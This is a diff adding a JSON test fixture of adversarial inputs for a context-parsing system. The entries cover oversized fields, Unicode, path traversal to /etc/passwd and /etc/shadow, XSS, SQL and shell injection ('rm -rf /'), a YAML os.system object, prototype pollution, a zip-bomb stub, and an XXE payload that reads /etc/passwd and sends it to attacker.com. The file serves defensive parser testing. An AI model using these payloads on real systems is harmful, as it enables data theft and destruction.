@@ -1,0 +1,302 @@
+[
+  {
+    "file": "",
+    "content": "",
+    "metadata": {}
+  },
+  {
+    "file": "very_long_filename_that_exceeds_reasonable_limits_and_might_cause_buffer_overflows_or_memory_issues_when_processed_by_the_context_parsing_system_with_additional_characters_to_test_filesystem_limits_and_memory_allocation_boundaries_in_context_parsing_logic.txt",
+    "content": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "metadata": {
+      "title": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
+      "description": "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY",
+      "version": "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
+      "author": "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW",
+      "encoding": "utf-8",
+      "size_bytes": 65536,
+      "test_type": "buffer_overflow_boundary"
+    }
+  },
+  {
+    "file": "unicode_test_normalized.md",
+    "content": "# Unicode Test Document\n\nTesting comprehensive Unicode character handling with proper normalization:\n\n## Mathematical Symbols\n∑ ∏ √ ∫ ∂ ∆ ∇ ∞ ∅ ∈ ∉ ⊂ ⊃ ∪ ∩ ∧ ∨ ¬ ≡ ≅ ≈ ≠ ≤ ≥ ≪ ≫ ℝ ℂ ℕ ℤ ℚ\n\n## Combining Characters\nCafe (e with accent)\nnaive (i with diaeresis)\nresume (e with accent)\n\n## Right-to-Left Text\nArabic and Hebrew text\n\n## Special Whitespace\nNon-breaking space and zero-width characters\n\n## Control Characters (Escaped)\n\\\\u0000 \\\\u0001 \\\\u0002 \\\\u0003 \\\\u0004 \\\\u0005 \\\\u0006 \\\\u0007\n\\\\u0008 \\\\u0009 \\\\u000A \\\\u000B \\\\u000C \\\\u000D \\\\u000E \\\\u000F\n",
+    "metadata": {
+      "title": "Comprehensive Unicode Test Document",
+      "description": "Testing Unicode normalization, encoding, and edge cases in context parsing with proper UTF-8 handling",
+      "version": "2.0.0-stable",
+      "author": "Test User",
+      "encoding": "utf-8",
+      "normalization": "NFC",
+      "test_categories": ["emoji", "mathematical", "rtl", "combining", "control"],
+      "character_count": 847,
+      "byte_size": 1024
+    }
+  },
+  {
+    "file": "path_traversal_test_..\\..\\..\\etc\\passwd.txt",
+    "content": "Testing path traversal patterns in filenames:\n../../../etc/passwd\n..\\..\\..\\windows\\system32\\config\\sam\n/etc/shadow\n\\\\?\\C:\\Windows\\System32\\drivers\\etc\\hosts\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n..%252f..%252f..%252fetc%252fpasswd\n",
+    "metadata": {
+      "title": "Path Traversal Security Test",
+      "description": "Testing filename validation against directory traversal attacks",
+      "version": "1.0.0",
+      "author": "Security Tester",
+      "security_test": true,
+      "attack_vectors": ["dot_dot_slash", "backslash", "url_encoding", "double_encoding"]
+    }
+  },
+  {
+    "file": "json_injection_test_\"};alert('xss');{\"a\":\".json",
+    "content": "{\"malicious\": \"payload\", \"script\": \"<script>alert('xss')</script>\", \"sql\": \"'; DROP TABLE users; --\", \"command\": \"$(rm -rf /)\", \"template\": \"{{7*7}}\", \"deserialization\": \"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==\"}",
+    "metadata": {
+      "title": "JSON Injection Test",
+      "description": "Testing JSON parsing security against injection attacks",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "security_test": true,
+      "injection_types": ["xss", "sql", "command", "template", "deserialization"]
+    }
+  },
+  {
+    "file": "null_byte_test_\u0000hidden.txt",
+    "content": "Testing null byte handling in filenames and content:\nVisible content\u0000Hidden content after null byte\nMore visible content",
+    "metadata": {
+      "title": "Null Byte Security Test",
+      "description": "Testing null byte truncation vulnerabilities",
+      "version": "1.0.0",
+      "author": "Security Tester",
+      "contains_null_bytes": true,
+      "security_test": true
+    }
+  },
+  {
+    "file": "deeply_nested_structure_test.json",
+    "content": "{\"level1\":{\"level2\":{\"level3\":{\"level4\":{\"level5\":{\"level6\":{\"level7\":{\"level8\":{\"level9\":{\"level10\":{\"data\":\"deeply nested value\"}}}}}}}}}}",
+    "metadata": {
+      "title": "Deep Nesting Test",
+      "description": "Testing stack overflow protection in deeply nested JSON structures",
+      "version": "1.0.0",
+      "author": "Performance Tester",
+      "nesting_depth": 10,
+      "test_type": "recursion_limit"
+    }
+  },
+  {
+    "file": "circular_reference_test.json",
+    "content": "{\"self_reference\": \"#REF\", \"nested\": {\"parent\": \"#REF\"}}",
+    "metadata": {
+      "title": "Circular Reference Test",
+      "description": "Testing circular reference handling in JSON parsing",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "circular_reference",
+      "security_test": true
+    }
+  },
+  {
+    "file": "extreme_whitespace_test.json",
+    "content": "\n\n\t  \r\n  {\"test\": \"data with extreme whitespace\"}  \t\n\r  \n",
+    "metadata": {
+      "title": "Extreme Whitespace Test",
+      "description": "Testing whitespace handling in JSON parsing with tabs, newlines, carriage returns",
+      "version": "1.0.0",
+      "author": "Parser Tester",
+      "whitespace_chars": ["\\n", "\\t", "\\r", "space"],
+      "test_type": "whitespace_handling"
+    }
+  },
+  {
+    "file": "encoding_mismatch_test_utf16.json",
+    "content": "\uFEFF{\"test\": \"UTF-16 BOM with UTF-8 content\"}",
+    "metadata": {
+      "title": "Encoding Mismatch Test",
+      "description": "Testing UTF-16 BOM with UTF-8 content to test encoding detection",
+      "version": "1.0.0",
+      "author": "Encoding Tester",
+      "encoding": "utf-16-bom",
+      "test_type": "encoding_detection"
+    }
+  },
+  {
+    "file": "invalid_json_recovery_test.json",
+    "content": "{\"valid\": \"json\", \"trailing\": \"comma\",} {\"invalid\": \"recovery test\"}",
+    "metadata": {
+      "title": "Invalid JSON Recovery Test",
+      "description": "Testing parser behavior with invalid JSON and recovery scenarios",
+      "version": "1.0.0",
+      "author": "Robustness Tester",
+      "test_type": "error_recovery",
+      "contains_errors": ["trailing_comma", "multiple_objects"]
+    }
+  },
+  {
+    "file": "memory_exhaustion_test.json",
+    "content": "{\"large_array\": [\"test\",\"test\",\"test\",\"test\",\"test\"]}",
+    "metadata": {
+      "title": "Memory Exhaustion Test",
+      "description": "Testing memory exhaustion with large arrays",
+      "version": "1.0.0",
+      "author": "Resource Tester",
+      "test_type": "memory_exhaustion",
+      "array_size": 10000
+    }
+  },
+  {
+    "file": "special_floating_point_test.json",
+    "content": "{\"values\": [NaN, Infinity, -Infinity, 1.7976931348623157e+308, 2.2250738585072014e-308]}",
+    "metadata": {
+      "title": "Special Floating Point Test",
+      "description": "Testing special floating point values (NaN, Infinity, denormals)",
+      "version": "1.0.0",
+      "author": "Numerical Tester",
+      "test_type": "floating_point",
+      "special_values": ["NaN", "Infinity", "-Infinity", "max_double", "min_double"]
+    }
+  },
+  {
+    "file": "regex_dos_test.json",
+    "content": "{\"pattern\": \"aa?a?a?a?a?\"}",
+    "metadata": {
+      "title": "Regex DoS Test",
+      "description": "Testing catastrophic backtracking in regex patterns",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "regex_dos",
+      "security_test": true,
+      "attack_type": "catastrophic_backtracking"
+    }
+  },
+  {
+    "file": "prototype_pollution_test.json",
+    "content": "{\"__proto__\": {\"isAdmin\": true}, \"constructor\": {\"prototype\": {\"isAdmin\": true}}, \"data\": \"test\"}",
+    "metadata": {
+      "title": "Prototype Pollution Test",
+      "description": "Testing prototype pollution vulnerabilities in JSON parsing",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "prototype_pollution",
+      "security_test": true,
+      "attack_type": "prototype_pollution"
+    }
+  },
+  {
+    "file": "yaml_parsing_edge_cases.yaml",
+    "content": "---\n# YAML parsing edge cases and injection attempts\n\n# Anchor and alias exploitation\nanchor_test: &anchor_value \"malicious: content\"\nreference: *anchor_value\n\n# Type confusion with !!python/object\npython_object: !!python/object:os.system\n  - 'rm -rf /'\n\n# Environment variable expansion\nenv_expansion: ${PATH}\nenv_injection: ${MALICIOUS_COMMAND:-rm -rf /}\n\n# Command execution via shell expansion\nshell_expansion: $(echo 'malicious command')\nbacktick_expansion: `cat /etc/passwd`\n\n# Unicode normalization attacks\nunicode_normalization: \"ñ\"\nunicode_homoglyph: \"аdmin\" # Cyrillic 'а'\n\n# Deep recursion via anchors\nlevel1: &level1\n  level2: &level2\n    level3: &level3\n      level4: &level4\n        level5: &level5\n          self: *level1\n",
+    "metadata": {
+      "title": "YAML Parsing Edge Cases",
+      "description": "Testing YAML parsing vulnerabilities including anchor exploitation, type confusion, and injection attacks",
+      "version": "2.0.0",
+      "author": "Security Researcher",
+      "test_type": "yaml_parsing",
+      "security_test": true,
+      "attack_types": ["anchor_exploitation", "type_confusion", "env_injection", "rce", "unicode_attacks"],
+      "parser_features": ["anchors", "shell_expansion", "env_vars", "python_objects"]
+    }
+  },
+  {
+    "file": "xml_external_entity_attack.xml",
+    "content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>\">\n  %eval;\n  %exfiltrate;\n]>\n<root>\n  <data>Test data with XXE attack</data>\n</root>",
+    "metadata": {
+      "title": "XML External Entity Attack",
+      "description": "Testing XXE vulnerabilities in XML parsing with external entity injection",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "xxe_attack",
+      "security_test": true,
+      "attack_type": "xml_external_entity",
+      "vulnerability_class": "information_disclosure"
+    }
+  },
+  {
+    "file": "timing_attack_precision_test.json",
+    "content": "{\"timing_attack\": \"A\", \"precision_test\": [\"test\",\"test\",\"test\"], \"cache_timing\": \"secret_key_comparison_data\"}",
+    "metadata": {
+      "title": "Timing Attack Precision Test",
+      "description": "Testing timing attack vulnerabilities with high-precision measurements and cache timing",
+      "version": "2.0.0",
+      "author": "Security Researcher",
+      "test_type": "timing_attack",
+      "security_test": true,
+      "attack_type": "timing_side_channel",
+      "test_parameters": {
+        "large_string_size": 1000000,
+        "array_elements": 1000,
+        "repetitions": 1000
+      }
+    }
+  },
+  {
+    "file": "integer_overflow_edge_cases.json",
+    "content": "{\"max_int\": 9223372036854775807, \"min_int\": -9223372036854775808, \"overflow_test\": 9223372036854775808, \"underflow_test\": -9223372036854775809, \"scientific_notation\": 1e308, \"hex_notation\": 0xFFFFFFFFFFFFFFFF, \"octal_notation\": 01777777777777777777777, \"binary_notation\": 0b111111111111111111111111111111111111111111111111111111111111111}",
+    "metadata": {
+      "title": "Integer Overflow Edge Cases",
+      "description": "Testing integer overflow, underflow, and boundary conditions in numeric parsing",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "integer_overflow",
+      "security_test": true,
+      "boundary_values": ["max_int64", "min_int64", "overflow", "underflow", "scientific", "hex", "octal", "binary"],
+      "vulnerability_types": ["buffer_overflow", "infinite_loop", "memory_corruption"]
+    }
+  },
+  {
+    "file": "compression_bomb_test.gz",
+    "content": "PK\\x03\\x04\\x14\\x00\\x08\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00data.txt",
+    "metadata": {
+      "title": "Compression Bomb Test",
+      "description": "Testing zip bomb and compression-based denial of service attacks",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "compression_bomb",
+      "security_test": true,
+      "attack_type": "zip_bomb",
+      "compression_ratio": "1000000:1",
+      "file_type": "zip_archive"
+    }
+  },
+  {
+    "file": "race_condition_timing.json",
+    "content": "{\"concurrent_access\": true, \"shared_resource\": \"critical_section\", \"timing_windows\": [0.001, 0.01, 0.1], \"iterations\": 1000000, \"threads\": 100}",
+    "metadata": {
+      "title": "Race Condition Timing Test",
+      "description": "Testing race conditions and timing windows in concurrent processing",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "race_condition",
+      "security_test": true,
+      "attack_type": "race_condition",
+      "concurrency_parameters": {
+        "thread_count": 100,
+        "iterations_per_thread": 10000,
+        "timing_precision_ms": 1
+      }
+    }
+  },
+  {
+    "file": "side_channel_attack_test.json",
+    "content": "{\"electromagnetic\": \"EM emissions test data\", \"power_consumption\": \"power analysis patterns\", \"cache_timing\": \"cache_line_data\", \"branch_prediction\": [true, false, true, false, true, false]}",
+    "metadata": {
+      "title": "Side Channel Attack Test",
+      "description": "Testing side channel vulnerabilities including cache timing, power analysis, and EM emissions",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "side_channel",
+      "security_test": true,
+      "attack_types": ["cache_timing", "power_analysis", "electromagnetic"],
+      "test_vectors": ["cache_line_data", "branch_patterns", "power_signatures"]
+    }
+  },
+  {
+    "file": "parser_differential_attack.json",
+    "content": "{\"html_parsing\": \"<script>alert('xss')</script>\", \"json_parsing\": \"{\\\"injected\\\": \\\"code\\\"}\", \"xml_parsing\": \"<?xml-stylesheet href=\\\"javascript:alert('xss')\\\"?><root/>\", \"url_parsing\": \"javascript:alert('xss')\", \"sql_parsing\": \"'; DROP TABLE users; --\"}",
+    "metadata": {
+      "title": "Parser Differential Attack Test",
+      "description": "Testing differential parsing behavior across multiple parsers for bypass opportunities",
+      "version": "1.0.0",
+      "author": "Security Researcher",
+      "test_type": "parser_differential",
+      "security_test": true,
+      "parsers_tested": ["html", "json", "xml", "url", "sql"],
+      "attack_type": "parser_differential_bypass"
+    }
+  }
+]
